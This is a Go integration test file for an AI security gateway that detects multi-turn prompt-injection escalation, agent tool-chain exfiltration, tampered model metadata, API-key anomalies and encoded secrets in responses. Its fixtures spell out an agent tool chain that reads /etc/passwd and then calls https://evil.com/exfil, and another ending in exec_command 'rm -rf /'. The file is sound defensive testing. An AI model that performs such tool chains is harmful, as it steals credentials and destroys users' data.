// SPDX-License-Identifier: Apache-2.0
// AegisGate Platform — P1-P5 Integration Tests
//
// These tests validate the behavioral/analytical detection capabilities
// (P1-P5) with adversarial scenarios that go beyond simple L1 regex matching.
// Each test simulates a real-world attack pattern that the corresponding
// capability is designed to detect.
//
// Unlike unit tests (which test functions in isolation), these integration
// tests exercise the full detection pipeline with multi-step attack scenarios:
//
//   P1: Multi-turn session correlation — escalating injection across turns
//   P2: Tool call chain analysis — recon→exfil chain via MCP tools
//   P3: AIBOM model provenance — tampered model metadata detection
//   P4: API key anomaly detection — abnormal usage pattern baselining
//   P5: Egress exfiltration scoring — sensitive data in response body

package integration_test

import (
	"testing"
	"time"

	"github.com/aegisgatesecurity/aegisgate-platform/pkg/aibom"
	"github.com/aegisgatesecurity/aegisgate-platform/pkg/auth"
	"github.com/aegisgatesecurity/aegisgate-platform/pkg/response"
	platformscanner "github.com/aegisgatesecurity/aegisgate-platform/pkg/scanner"
	"github.com/aegisgatesecurity/aegisgate-platform/pkg/toolauth"
)

// =====================================================================
// P1: Multi-Turn Session Correlation Integration Test
// =====================================================================

func TestP1_MultiTurnEscalationDetection(t *testing.T) {
	st := platformscanner.NewSessionTracker()
	sessionID := "sess-adversarial-001"

	// Simulate a real multi-turn attack: starts benign, escalates over 5 turns
	turns := []platformscanner.TurnFinding{
		{Severity: "info", Technique: "", PatternID: ""},
		{Severity: "low", Technique: "T1535", PatternID: "owasp_llm01_prompt_injection"},
		{Severity: "medium", Technique: "T1535", PatternID: "owasp_llm01_prompt_injection"},
		{Severity: "high", Technique: "T1484", PatternID: "atlas_jailbreak"},
		{Severity: "critical", Technique: "T1589", PatternID: "atlas_data_exfiltration_query"},
	}

	for _, turn := range turns {
		st.RecordFinding(sessionID, turn)
	}

	result := st.AnalyzeSession(sessionID)

	// After 5 escalating turns, risk should be high
	if result.TurnCount != 5 {
		t.Errorf("expected 5 turns, got %d", result.TurnCount)
	}
	if result.RiskLevel < platformscanner.MultiTurnRiskHigh {
		t.Errorf("expected risk >= High (%d), got %d", platformscanner.MultiTurnRiskHigh, result.RiskLevel)
	}
	if result.EscalationScore <= 0 {
		t.Error("expected positive escalation score for escalating severity chain")
	}

	t.Logf("P1 Result: turns=%d, escalation=%.2f, repetition=%.2f, risk=%d",
		result.TurnCount, result.EscalationScore, result.RepetitionScore, result.RiskLevel)
}

func TestP1_MultiTurnRepetitionDetection(t *testing.T) {
	st := platformscanner.NewSessionTracker()
	sessionID := "sess-repetition-001"

	// Simulate technique repetition: same pattern repeated across turns
	for i := 0; i < 4; i++ {
		st.RecordFinding(sessionID, platformscanner.TurnFinding{
			Severity:  "medium",
			Technique: "T1535",
			PatternID: "owasp_llm01_prompt_injection",
		})
	}

	result := st.AnalyzeSession(sessionID)

	if result.RepetitionScore <= 0 {
		t.Error("expected positive repetition score for repeated technique")
	}
	t.Logf("P1 Repetition: turns=%d, repetition=%.2f, risk=%d",
		result.TurnCount, result.RepetitionScore, result.RiskLevel)
}

func TestP1_BenignSessionNotFlagged(t *testing.T) {
	st := platformscanner.NewSessionTracker()
	sessionID := "sess-benign-001"

	// Single low-severity finding should not trigger high risk
	st.RecordFinding(sessionID, platformscanner.TurnFinding{
		Severity:  "low",
		Technique: "",
		PatternID: "",
	})

	result := st.AnalyzeSession(sessionID)

	if result.RiskLevel >= platformscanner.MultiTurnRiskHigh {
		t.Errorf("benign session should not be high risk, got risk=%d", result.RiskLevel)
	}
}

// =====================================================================
// P2: Tool Call Chain Analysis Integration Test
// =====================================================================

func TestP2_ExfiltrationChainDetection(t *testing.T) {
	ca := toolauth.NewChainAnalyzer()
	sessionID := "sess-chain-exfil-001"

	// Simulate a recon→exfil chain: read_file → list_directory → read → network
	chain := []toolauth.ChainEntry{
		{ToolName: "read_file", RiskLevel: toolauth.RiskLevelLow, Decision: "allow", DataType: "read", Target: "/app/config.json", Timestamp: time.Now()},
		{ToolName: "list_directory", RiskLevel: toolauth.RiskLevelLow, Decision: "allow", DataType: "read", Target: "/etc/", Timestamp: time.Now().Add(time.Second)},
		{ToolName: "read_file", RiskLevel: toolauth.RiskLevelMedium, Decision: "allow", DataType: "read", Target: "/etc/passwd", Timestamp: time.Now().Add(2 * time.Second)},
		{ToolName: "http_request", RiskLevel: toolauth.RiskLevelHigh, Decision: "allow", DataType: "network", Target: "https://evil.com/exfil", Timestamp: time.Now().Add(3 * time.Second)},
	}

	for _, entry := range chain {
		ca.RecordCall(sessionID, entry)
	}

	result := ca.AnalyzeChain(sessionID)

	// Should detect exfiltration chain pattern
	if !result.ExfilChain {
		t.Error("expected exfiltration chain to be detected")
	}
	if len(result.Flags) == 0 {
		t.Error("expected flags on exfiltration chain")
	}

	t.Logf("P2 Exfil Chain: exfil=%v, recon=%v, flags=%v, risk=%d", result.ExfilChain, result.ReconChain, result.Flags, result.OverallRisk)
}

func TestP2_ReconChainDetection(t *testing.T) {
	ca := toolauth.NewChainAnalyzer()
	sessionID := "sess-chain-recon-001"

	// Simulate a reconnaissance chain: recon tool followed by high-risk execute
	// detectReconChain looks for: recon tool (list_files, read_config, get_env, etc.)
	// followed by an execute with RiskLevel >= High
	chain := []toolauth.ChainEntry{
		{ToolName: "list_files", RiskLevel: toolauth.RiskLevelLow, Decision: "allow", DataType: "read", Target: "/", Timestamp: time.Now()},
		{ToolName: "read_config", RiskLevel: toolauth.RiskLevelLow, Decision: "allow", DataType: "read", Target: "/etc/config", Timestamp: time.Now().Add(time.Second)},
		{ToolName: "get_env", RiskLevel: toolauth.RiskLevelLow, Decision: "allow", DataType: "read", Target: "env", Timestamp: time.Now().Add(2 * time.Second)},
		{ToolName: "exec_command", RiskLevel: toolauth.RiskLevelCritical, Decision: "allow", DataType: "execute", Target: "rm -rf /", Timestamp: time.Now().Add(3 * time.Second)},
	}

	for _, entry := range chain {
		ca.RecordCall(sessionID, entry)
	}

	result := ca.AnalyzeChain(sessionID)

	// Should detect reconnaissance chain (recon tool → high-risk execute)
	if !result.ReconChain {
		t.Error("expected reconnaissance chain to be detected (recon tool followed by high-risk execute)")
	}

	t.Logf("P2 Recon Chain: exfil=%v, recon=%v, flags=%v, risk=%d", result.ExfilChain, result.ReconChain, result.Flags, result.OverallRisk)
}

func TestP2_BenignChainNotFlagged(t *testing.T) {
	ca := toolauth.NewChainAnalyzer()
	sessionID := "sess-chain-benign-001"

	// Simulate a benign chain: normal file operations
	chain := []toolauth.ChainEntry{
		{ToolName: "read_file", RiskLevel: toolauth.RiskLevelNone, Decision: "allow", DataType: "read", Target: "/app/data/users.json", Timestamp: time.Now()},
		{ToolName: "read_file", RiskLevel: toolauth.RiskLevelNone, Decision: "allow", DataType: "read", Target: "/app/data/products.json", Timestamp: time.Now().Add(time.Second)},
	}

	for _, entry := range chain {
		ca.RecordCall(sessionID, entry)
	}

	result := ca.AnalyzeChain(sessionID)

	if result.ExfilChain {
		t.Error("benign chain should not be flagged as exfiltration")
	}
	if result.ReconChain {
		t.Error("benign chain should not be flagged as reconnaissance")
	}
}

// =====================================================================
// P3: AIBOM Model Provenance Integration Test
// =====================================================================

func TestP3_ProvenanceValidation_TamperedModel(t *testing.T) {
	pr := aibom.NewProvenanceRecorder()

	// Record a legitimate model
	meta := aibom.ModelProvenance{
		ModelName:         "aegisgate-l3",
		ModelVersion:      "v11b",
		ModelFormat:       "onnx",
		ModelParamCount:   1596034,
		TrainingDataset:   "aegisgate-prompt-corpus-v3",
		TrainingFramework: "PyTorch 2.4.0",
		TrainingStartDate: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
		TrainingEndDate:   time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC),
		Hyperparameters:   map[string]any{"lr": 0.001, "epochs": 50},
		EvalMetrics:       map[string]float64{"accuracy": 98.27, "f1": 0.98},
	}

	modelBytes := []byte("fake-model-bytes-for-testing")
	if err := pr.RecordModel(modelBytes, meta); err != nil {
		t.Fatalf("RecordModel failed: %v", err)
	}

	// Validate — should pass with no issues
	issues := pr.ValidateProvenance("aegisgate-l3", "v11b")
	if len(issues) > 0 {
		t.Errorf("expected no validation issues for legitimate model, got: %v", issues)
	}

	// Now simulate a tampered model — record a model with missing required fields
	tampered := aibom.ModelProvenance{
		ModelName:    "aegisgate-l3",
		ModelVersion: "v11c",
		ModelFormat:  "onnx",
		// Missing: TrainingDataset, TrainingFramework, TrainingDates
	}
	_ = pr.RecordModel(modelBytes, tampered)

	issues = pr.ValidateProvenance("aegisgate-l3", "v11c")
	if len(issues) == 0 {
		t.Error("expected validation issues for tampered model with missing fields")
	}

	t.Logf("P3 Tampered: %d validation issues found", len(issues))
}

func TestP3_ProvenanceJSONExport(t *testing.T) {
	pr := aibom.NewProvenanceRecorder()

	meta := aibom.ModelProvenance{
		ModelName:         "test-model",
		ModelVersion:      "v1",
		ModelFormat:       "onnx",
		TrainingDataset:   "test-corpus",
		TrainingFramework: "PyTorch 2.4.0",
		TrainingStartDate: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
		TrainingEndDate:   time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC),
	}

	_ = pr.RecordModel([]byte("test"), meta)

	jsonBytes, err := pr.ToJSON("test-model", "v1")
	if err != nil {
		t.Fatalf("ToJSON failed: %v", err)
	}
	if len(jsonBytes) == 0 {
		t.Error("expected non-empty JSON output")
	}

	t.Logf("P3 JSON Export: %d bytes", len(jsonBytes))
}

// =====================================================================
// P4: API Key Anomaly Detection Integration Test
// =====================================================================

func TestP4_AnomalyDetection_AbnormalUsageSpike(t *testing.T) {
	ad := auth.NewAnomalyDetector()
	keyID := "key-adversarial-001"

	// Build a baseline: normal usage pattern (9am-5pm, same IP, same tool)
	for day := 0; day < 7; day++ {
		for hour := 9; hour < 17; hour++ {
			ad.RecordUsage(auth.KeyUsageRecord{
				KeyID:     keyID,
				ToolName:  "read_file",
				SourceIP:  "10.0.0.1",
				Endpoint:  "/api/v1/files",
				Timestamp: time.Date(2026, 9, day+1, hour, 0, 0, 0, time.UTC),
			})
		}
	}

	// Now simulate an anomaly: request at 3am from a different IP with a different tool
	anomalyRec := auth.KeyUsageRecord{
		KeyID:     keyID,
		ToolName:  "delete_file",
		SourceIP:  "203.0.113.99", // external IP
		Endpoint:  "/api/v1/files/delete",
		Timestamp: time.Date(2026, 9, 8, 3, 0, 0, 0, time.UTC), // 3am
	}

	result := ad.CheckAnomaly(keyID, anomalyRec)

	// Should flag as anomalous (off-hours usage)
	if !result.IsAnomalous {
		t.Error("expected 3am burst from new IP to be flagged as anomalous")
	}

	t.Logf("P4 Anomaly: detected=%v, types=%v, details=%v", result.IsAnomalous, result.Types, result.Details)
}

func TestP4_AnomalyDetection_NormalUsageNotFlagged(t *testing.T) {
	ad := auth.NewAnomalyDetector()
	keyID := "key-benign-001"

	// Build baseline
	for day := 0; day < 7; day++ {
		for hour := 10; hour < 16; hour++ {
			ad.RecordUsage(auth.KeyUsageRecord{
				KeyID:     keyID,
				ToolName:  "read_file",
				SourceIP:  "10.0.0.5",
				Endpoint:  "/api/v1/files",
				Timestamp: time.Date(2026, 9, day+1, hour, 0, 0, 0, time.UTC),
			})
		}
	}

	// Normal usage within baseline pattern
	normalRec := auth.KeyUsageRecord{
		KeyID:     keyID,
		ToolName:  "read_file",
		SourceIP:  "10.0.0.5",
		Endpoint:  "/api/v1/files",
		Timestamp: time.Date(2026, 9, 8, 11, 0, 0, 0, time.UTC), // 11am, same IP
	}

	result := ad.CheckAnomaly(keyID, normalRec)

	if result.IsAnomalous {
		t.Error("normal usage within baseline should not be flagged")
	}

	t.Logf("P4 Normal: detected=%v, types=%v", result.IsAnomalous, result.Types)
}

// =====================================================================
// P5: Egress Exfiltration Scoring Integration Test
// =====================================================================

func TestP5_ExfiltrationScoring_SensitiveDataInResponse(t *testing.T) {
	ed := response.NewExfilDetector()

	// Simulate a response with encoded sensitive data + ingress alert + aggregation
	// Score = 0.3 (aggregation) + 0.25 (encoded) + 0.2 (ingress) = 0.75 >= 0.6 threshold
	result := ed.Analyze(response.ExfilInput{
		ResponseBody:    "ZXhwb3J0IERTX1BBU1NXT1JEPXN1cGVyc2VjcmV0MTIzNDU=",
		SensitiveCount:  5, // >= MaxSensitiveFindingsPerResponse triggers aggregation
		HasIngressAlert: true,
	})

	// Should be flagged as exfiltration
	if !result.IsExfil {
		t.Errorf("expected response with 5 sensitive items + encoded + ingress alert to be flagged as exfil, got score=%.2f", result.Score)
	}
	if result.Score < response.ExfilScoreThreshold {
		t.Errorf("expected score >= %.1f, got %.1f", response.ExfilScoreThreshold, result.Score)
	}

	t.Logf("P5 Exfil: detected=%v, score=%.2f, flags=%v, encoded=%v", result.IsExfil, result.Score, result.Flags, result.EncodedData)
}

func TestP5_ExfiltrationScoring_EncodedDataInResponse(t *testing.T) {
	ed := response.NewExfilDetector()

	// Simulate a response with base64-encoded data + ingress alert + aggregation
	result := ed.Analyze(response.ExfilInput{
		ResponseBody:    "ZXhwb3J0IERTX1BBU1NXT1JEPXN1cGVyc2VjcmV0MTIzNDU=",
		SensitiveCount:  5,
		HasIngressAlert: true,
	})

	t.Logf("P5 Encoded Exfil: detected=%v, score=%.2f, flags=%v, encoded=%v", result.IsExfil, result.Score, result.Flags, result.EncodedData)

	if !result.IsExfil {
		t.Errorf("expected encoded content with aggregation + ingress to be flagged, got score=%.2f", result.Score)
	}
}

func TestP5_ExfiltrationScoring_BenignResponseNotFlagged(t *testing.T) {
	ed := response.NewExfilDetector()

	// Normal response with no sensitive data
	result := ed.Analyze(response.ExfilInput{
		ResponseBody:   "The capital of France is Paris. It is known for the Eiffel Tower.",
		SensitiveCount: 0,
	})

	if result.IsExfil {
		t.Error("benign response should not be flagged as exfiltration")
	}

	t.Logf("P5 Benign: detected=%v, score=%.2f", result.IsExfil, result.Score)
}

func TestP5_ExfiltrationScoring_RepeatedAttemptsEscalate(t *testing.T) {
	ed := response.NewExfilDetector()
	sessionID := "sess-exfil-escalation"

	// First attempt — all three factors: 0.3 + 0.25 + 0.2 = 0.75 >= 0.6 threshold
	result1 := ed.Analyze(response.ExfilInput{
		ResponseBody:    "ZXhwb3J0IERTX1BBU1NXT1JEPXN1cGVyc2VjcmV0MTIzNDU=",
		SensitiveCount:  5,
		HasIngressAlert: true,
		SessionID:       sessionID,
	})
	t.Logf("P5 Attempt 1: score=%.2f, is_exfil=%v", result1.Score, result1.IsExfil)

	if !result1.IsExfil {
		t.Fatalf("first attempt should be flagged as exfil to start escalation tracking, got score=%.2f", result1.Score)
	}

	// Second attempt — should escalate (session attempt count is now > 0, adding 0.15)
	result2 := ed.Analyze(response.ExfilInput{
		ResponseBody:    "ZXhwb3J0IERTX1BBU1NXT1JEPXN1cGVyc2VjcmV0MTIzNDU=",
		SensitiveCount:  5,
		HasIngressAlert: true,
		SessionID:       sessionID,
	})
	t.Logf("P5 Attempt 2: score=%.2f, is_exfil=%v", result2.Score, result2.IsExfil)

	// Verify session attempt count increases
	attempts := ed.GetSessionAttempts(sessionID)
	if attempts < 2 {
		t.Errorf("expected >= 2 session attempts, got %d", attempts)
	}

	// Second attempt should have higher score due to repeated_exfil_attempt flag
	if result2.Score <= result1.Score {
		t.Errorf("expected second attempt score (%.2f) to exceed first (%.2f) due to escalation", result2.Score, result1.Score)
	}
}
